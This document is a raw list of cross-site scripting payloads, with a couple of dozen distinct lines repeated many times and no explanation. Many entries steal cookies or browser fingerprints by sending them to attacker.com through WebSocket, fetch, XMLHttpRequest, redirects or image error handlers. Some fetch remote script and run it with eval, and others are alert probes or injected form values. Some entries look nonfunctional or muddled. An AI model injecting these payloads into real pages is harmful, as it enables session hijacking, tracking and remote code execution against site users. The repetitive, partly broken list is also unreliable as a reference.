<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
